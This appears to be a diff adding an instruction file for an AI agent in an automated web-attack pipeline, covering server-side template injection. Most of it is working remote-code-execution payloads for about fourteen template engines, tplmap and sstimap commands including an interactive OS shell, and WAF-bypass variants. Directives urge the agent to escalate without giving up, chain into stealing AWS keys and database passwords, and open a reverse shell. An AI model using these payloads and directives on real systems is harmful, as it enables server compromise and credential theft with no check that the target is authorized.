@@ -1,0 +1,518 @@
+# Task 48: SSTI (Server-Side Template Injection) Scanner
+# ==============================================================================
+# JULES AI AGENT INSTRUCTIONS - FULL BRAIN MODE
+# ==============================================================================
+
+## TASK IDENTITY
+- **Task Number**: 48
+- **Task Name**: SSTI Scanner → RCE
+- **Category**: Phase 4 - Injection Testing (Step 13)
+- **Depends On**: Task 32 (WAF detection), Task 35 (Tech detection)
+- **AI Brain**: ssti_scanner.py
+
+## PURPOSE
+Detect Server-Side Template Injection vulnerabilities that lead to RCE.
+Uses Tplmap, SSTImap, and TInjA with engine-specific payloads.
+
+SSTI is HIGH IMPACT - successful exploitation = full RCE on server.
+
+## INPUT FILES
+
+```
+PRIMARY (parameterized URLs):
+├── outputs/queue_dynamic_endpoints_urls.txt   # Dynamic URLs (Task 22)
+├── outputs/arjun_found_params.txt             # Hidden params (Task 34)
+├── outputs/api_endpoints_live.txt             # API endpoints (Task 38)
+├── outputs/queue_api_endpoints_kiterunner.txt # Kiterunner routes
+
+INTELLIGENCE:
+├── outputs/waf/waf_results.json               # WAF type (Task 32)
+├── outputs/nuclei/tech_stack.json             # Tech stack (Task 35)
+
+HAR-DERIVED:
+├── outputs/har/common_data.txt                # HAR endpoints
+```
+
+## OUTPUT FILES
+
+```
+outputs/ssti/
+├── ssti_vulnerable.txt           # Confirmed SSTI vulns
+├── ssti_possible.txt             # Heuristic matches (need manual)
+├── ssti_results.json             # Full scan results
+├── engine_detected.txt           # Detected template engines
+
+outputs/vulnerabilities/
+├── SSTI-{engine}-{hash}-CRITICAL.md
+```
+
+## TEMPLATE ENGINES & DETECTION
+
+### Engine Identification Polyglots
+
+```
+Primary polyglot (tests multiple engines):
+${{<%[%'"}}%\.
+
+Response analysis:
+- If "49" appears → Twig, Jinja2, or similar (7*7 evaluated)
+- If "${{7*7}}" reflected as-is → No SSTI
+- If error with template syntax → Engine revealed in error
+```
+
+### Engine-Specific Probes
+
+```yaml
+jinja2:  # Python (Flask, Django)
+  detect: "{{7*7}}"
+  confirm: "{{config}}"
+  rce: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+twig:  # PHP (Symfony)
+  detect: "{{7*7}}"
+  confirm: "{{_self.env.display}}"
+  rce: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+
+freemarker:  # Java
+  detect: "${7*7}"
+  confirm: "${.version}"
+  rce: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+
+velocity:  # Java (Apache)
+  detect: "#set($x=7*7)$x"
+  confirm: "$class.inspect"
+  rce: "#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('id'))"
+
+thymeleaf:  # Java (Spring)
+  detect: "[[${7*7}]]"
+  confirm: "[[${T(java.lang.System).getenv()}]]"
+  rce: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+
+mako:  # Python
+  detect: "${7*7}"
+  rce: "<%import os%>${os.popen('id').read()}"
+
+smarty:  # PHP
+  detect: "{7*7}"
+  confirm: "{$smarty.version}"
+  rce: "{system('id')}"
+
+pebble:  # Java
+  detect: "{{7*7}}"
+  rce: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}"
+
+erb:  # Ruby (Rails)
+  detect: "<%= 7*7 %>"
+  rce: "<%= system('id') %>"
+
+handlebars:  # JavaScript
+  detect: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}"
+
+ejs:  # JavaScript (Node.js)
+  detect: "<%= 7*7 %>"
+  rce: "<%= global.process.mainModule.require('child_process').execSync('id') %>"
+
+nunjucks:  # JavaScript
+  detect: "{{7*7}}"
+  rce: "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"
+
+tornado:  # Python
+  detect: "{{7*7}}"
+  rce: "{% import os %}{{os.popen('id').read()}}"
+
+jade/pug:  # JavaScript
+  detect: "#{7*7}"
+  rce: "#{global.process.mainModule.require('child_process').execSync('id')}"
+```
+
+## SSTI-LIKELY PARAMETERS
+
+```python
+# Parameters commonly processed by template engines
+SSTI_PARAMS = {
+    'high_priority': [
+        'template', 'tmpl', 'tpl', 'view', 'layout', 'theme',
+        'skin', 'preview', 'render', 'format', 'content',
+        'message', 'msg', 'text', 'body', 'subject', 'title',
+        'name', 'email', 'username', 'comment', 'bio',
+        'description', 'summary', 'review', 'feedback',
+    ],
+    'medium_priority': [
+        'q', 'query', 'search', 's', 'keyword',
+        'page', 'doc', 'article', 'post',
+        'data', 'input', 'value', 'field',
+        'error', 'debug', 'display',
+    ],
+    'email_context': [  # Email templates often vulnerable
+        'to', 'from', 'cc', 'bcc', 'reply',
+        'subject', 'body', 'signature',
+    ],
+    'pdf_context': [  # PDF generation often uses templates
+        'html', 'content', 'template', 'header', 'footer',
+    ]
+}
+```
+
+## TOOLS
+
+### 1. Tplmap (Primary)
+
+```bash
+# Basic scan
+tplmap -u "http://target/?param=test"
+
+# POST data
+tplmap -u "http://target/" -d "param=test"
+
+# With cookies
+tplmap -u "http://target/?param=test" --cookie "session=abc123"
+
+# Force engine
+tplmap -u "http://target/?param=test" --engine jinja2
+
+# OS command execution (if vulnerable)
+tplmap -u "http://target/?param=test" --os-cmd "id"
+
+# Interactive shell
+tplmap -u "http://target/?param=test" --os-shell
+```
+
+### 2. SSTImap (Secondary)
+
+```bash
+# Basic scan
+sstimap -u "http://target/?param=test"
+
+# POST request
+sstimap -u "http://target/" -d "param=test"
+
+# JSON body
+sstimap -u "http://target/" --data '{"param":"test"}' --json
+
+# All parameters
+sstimap -u "http://target/?a=1&b=2" --crawl
+
+# Execute command
+sstimap -u "http://target/?param=test" --os-cmd "id"
+```
+
+### 3. TInjA (Hackmanit)
+
+```bash
+# Scan URL
+tinja url -u "http://target/?param=test"
+
+# With request file
+tinja request -r request.txt
+
+# Polyglot mode
+tinja url -u "http://target/?param=test" --polyglots
+```
+
+## AI BRAIN LOGIC
+
+```
+1. LOAD TARGETS
+   ├── Collect parameterized URLs from all sources
+   ├── Load WAF info (bypass selection)
+   └── Load tech stack (engine hints)
+
+2. PRIORITIZE PARAMETERS
+   ├── High: template, preview, render, message, etc.
+   ├── Medium: search, query, content, etc.
+   └── Deprioritize: id, page, sort
+
+3. DETERMINE LIKELY ENGINE FROM TECH STACK
+   ├── Python (Flask/Django) → Jinja2
+   ├── PHP (Symfony/Laravel) → Twig/Blade
+   ├── Java (Spring) → Thymeleaf/Freemarker
+   ├── Ruby (Rails) → ERB
+   ├── Node.js → EJS/Nunjucks/Pug
+   └── Unknown → Test all
+
+4. FOR EACH TARGET:
+   a. Send universal polyglot: ${{<%[%'"}}%\.
+   b. Analyze response for engine hints
+   c. If promising → Run Tplmap with engine hint
+   d. If Tplmap fails → Try SSTImap
+   e. If both fail but suspicious → Try TInjA
+
+5. CONFIRM EXPLOITATION
+   ├── Attempt OS command execution
+   ├── If RCE works → CRITICAL finding
+   └── Document engine and payload
+
+6. OUTPUT RESULTS
+   ├── ssti_vulnerable.txt (confirmed)
+   ├── ssti_possible.txt (need manual)
+   └── Vulnerability reports
+```
+
+## WAF BYPASS TECHNIQUES
+
+```yaml
+# Common SSTI WAF bypasses
+
+jinja2_bypass:
+  # Attribute access alternatives
+  - "{{request['__class__']}}"
+  - "{{request|attr('__class__')}}"
+  - "{{request.__getattribute__('__class__')}}"
+  
+  # String concatenation
+  - "{{''['__cla'+'ss__']}}"
+  - "{%set a='__cla'%}{%set b='ss__'%}{{''[a+b]}}"
+  
+  # Unicode bypass
+  - "{{''['\u005f\u005fclass\u005f\u005f']}}"
+  
+  # Filter bypass
+  - "{{lipsum.__globals__}}"
+  - "{{cycler.__init__.__globals__}}"
+  - "{{joiner.__init__.__globals__}}"
+
+twig_bypass:
+  # Alternative syntax
+  - "{{['id']|filter('system')}}"
+  - "{{['id']|map('system')}}"
+  - "{{{'id':'id'}|filter('system')}}"
+
+freemarker_bypass:
+  # Alternative execute
+  - "${'freemarker.template.utility.Execute'?new()('id')}"
+  - "[#assign ex='freemarker.template.utility.Execute'?new()][=ex('id')]"
+
+generic:
+  # URL encoding
+  - "%7b%7b7*7%7d%7d"
+  # Double encoding
+  - "%257b%257b7*7%257d%257d"
+  # Unicode
+  - "\u007b\u007b7*7\u007d\u007d"
+```
+
+## VULNERABILITY REPORT TEMPLATE
+
+```markdown
+# SSTI Vulnerability: SSTI-{engine}-{hash}
+
+## Summary
+| Field | Value |
+|-------|-------|
+| **ID** | SSTI-{engine}-{hash} |
+| **URL** | {url} |
+| **Parameter** | {param} |
+| **Template Engine** | {engine} |
+| **RCE Confirmed** | Yes/No |
+| **Severity** | CRITICAL |
+
+## Detection
+```
+Polyglot: ${{<%[%'"}}%\.
+Response indicated {engine} template processing
+```
+
+## Exploitation Payload
+```
+{payload}
+```
+
+## Command Output
+```
+{command_output}
+```
+
+## Impact
+- **Severity**: CRITICAL
+- Full Remote Code Execution on server
+- Read/write arbitrary files
+- Access to environment variables and secrets
+- Lateral movement to internal systems
+- Complete server compromise
+
+## Remediation
+1. **Never pass user input to template rendering**
+2. Use logic-less templates (Mustache) where possible
+3. Sandbox template execution
+4. Whitelist allowed template variables
+5. Escape all user input before rendering
+
+## References
+- [PortSwigger SSTI](https://portswigger.net/research/server-side-template-injection)
+- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+```
+
+## EXECUTION FLOW
+
+```
+┌─────────────────────────────────────────┐
+│  1. Collect parameterized URLs          │
+│     - Dynamic endpoints                 │
+│     - Hidden params (Arjun)             │
+│     - API endpoints                     │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  2. Load intelligence:                  │
+│     - WAF type → bypass selection       │
+│     - Tech stack → engine hints         │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  3. For each URL:                       │
+│     a. Send polyglot probe              │
+│     b. Analyze for engine signature     │
+│     c. Run Tplmap/SSTImap               │
+│     d. Attempt RCE if vulnerable        │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  4. Output:                             │
+│     - ssti_vulnerable.txt               │
+│     - SSTI-{engine}-*.md reports        │
+└─────────────────────────────────────────┘
+```
+
+## HOW TO RUN
+
+```bash
+# Full SSTI scan
+python ssti_scanner.py --workspace d:\wallet\Mylab
+
+# Specific URL
+python ssti_scanner.py --workspace d:\wallet\Mylab --url "http://target/?template=test"
+
+# Force specific engine
+python ssti_scanner.py --workspace d:\wallet\Mylab --engine jinja2
+
+# Resume from checkpoint
+python ssti_scanner.py --workspace d:\wallet\Mylab --resume
+
+# Skip RCE confirmation (detection only)
+python ssti_scanner.py --workspace d:\wallet\Mylab --no-exploit
+```
+
+## AI AGENT CREATIVITY DIRECTIVE
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│  The documented payloads are starting points - USE YOUR BRAIN!      │
+│                                                                     │
+│  ✓ If standard payloads blocked → try WAF bypass variants          │
+│  ✓ Observe error messages → they reveal engine and filter info     │
+│  ✓ Chain encoding: URL + Unicode + HTML entities                   │
+│  ✓ Try context-specific payloads (email, PDF, error pages)         │
+│  ✓ Look for second-order SSTI (stored → rendered elsewhere)        │
+│  ✓ Test alternative injection points (headers, cookies, JSON)      │
+│  ✓ Research new bypass techniques if standard ones fail            │
+│                                                                     │
+│  SSTI = RCE. Don't give up easily - this is a CRITICAL finding!    │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### Think Like an Attacker
+
+```yaml
+observe:
+  - What characters cause errors? (reveals engine)
+  - What's in error messages? (stack traces reveal engine)
+  - Does {{7*7}} return 49? (math evaluation = SSTI)
+  - Does ${7*7} return 49? (different syntax)
+
+adapt:
+  - If {{}} blocked → try ${}, #{}, <%%>, [[]]
+  - If "config" blocked → try attribute access tricks
+  - If "__" blocked → try string concatenation
+  - If direct RCE blocked → try file read first
+
+chain:
+  - SSTI → Environment variable leak → AWS keys
+  - SSTI → File read → Source code → More vulns
+  - SSTI → RCE → Reverse shell → Full compromise
+```
+
+## CONTEXT-SPECIFIC TESTING
+
+```yaml
+email_templates:
+  - Often render user input (name, subject)
+  - Test: registration confirmations, password resets
+  - Payload in: name field, email subject
+
+pdf_generation:
+  - HTML-to-PDF often uses templates
+  - Test: invoice generation, report export
+  - Payload in: content fields
+
+error_pages:
+  - Custom error pages may render input
+  - Test: 404 pages, search no-results
+  - Payload in: URL path, query string
+
+preview_features:
+  - "Preview" functionality often renders templates
+  - Test: email preview, document preview
+  - Payload in: preview content
+
+admin_panels:
+  - Admin template editors = direct SSTI
+  - Test: email template config, page builders
+```
+
+## COMMON MISTAKES TO AVOID
+
+```
+1. DON'T just test obvious params - test ALL params
+2. DON'T give up after one tool fails - try multiple
+3. DON'T ignore error messages - they reveal the engine
+4. DON'T forget POST body, JSON, headers as injection points
+5. DON'T skip encoded payloads when WAF present
+```
+
+## AI AGENT CREATIVITY DIRECTIVE
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    🧠 YOU ARE AN INTELLIGENT AGENT 🧠                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ SSTI is subtle. Automated tools miss it often. Use your INTELLIGENCE.       │
+│                                                                             │
+│ IDENTIFY THE ENGINE FIRST:                                                  │
+│                                                                             │
+│ 1. Send polyglot: ${{<%[%'"}}%\.                                            │
+│ 2. OBSERVE the response carefully:                                          │
+│    - "49" appears? → Mathematical evaluation works (Jinja2, Twig)           │
+│    - Error message? → READ IT - it names the engine!                        │
+│    - Reflected as-is? → No SSTI, move on                                    │
+│                                                                             │
+│ THINK ABOUT WHERE TEMPLATES ARE USED:                                       │
+│                                                                             │
+│ • Email templates → Your name in "Dear {{name}}" emails                     │
+│ • Error pages → "Page {{url}} not found"                                    │
+│ • PDF generation → Invoice with user-provided content                       │
+│ • Preview features → "Preview your message" functionality                   │
+│ • Admin panels → Template editors are goldmines                             │
+│                                                                             │
+│ ADAPT TO THE ENGINE:                                                        │
+│                                                                             │
+│ Once you identify the engine, use ENGINE-SPECIFIC payloads:                 │
+│ • Jinja2 → {{config.__class__.__init__.__globals__['os'].popen('id')}}     │
+│ • Twig → {{_self.env.registerUndefinedFilterCallback('exec')}}             │
+│ • Freemarker → ${"freemarker.template.utility.Execute"?new()("id")}        │
+│ • Velocity → #set($x=$rt.getRuntime().exec("id"))                          │
+│                                                                             │
+│ ESCALATE PROGRESSIVELY:                                                     │
+│                                                                             │
+│ 1. Confirm SSTI: {{7*7}} → see "49"?                                        │
+│ 2. Read config: {{config}} or {{settings}}                                  │
+│ 3. List methods: {{"".__class__.__mro__}}                                   │
+│ 4. Find os module: navigate MRO to find subprocess/os                       │
+│ 5. Execute command: call popen/system                                       │
+│                                                                             │
+│ CHAIN YOUR FINDINGS:                                                        │
+│ • SSTI → Environment variables → AWS keys, DB passwords                     │
+│ • SSTI → File read → Source code → More vulnerabilities                     │
+│ • SSTI → RCE → Reverse shell → Full server compromise                       │
+└─────────────────────────────────────────────────────────────────────────────┘
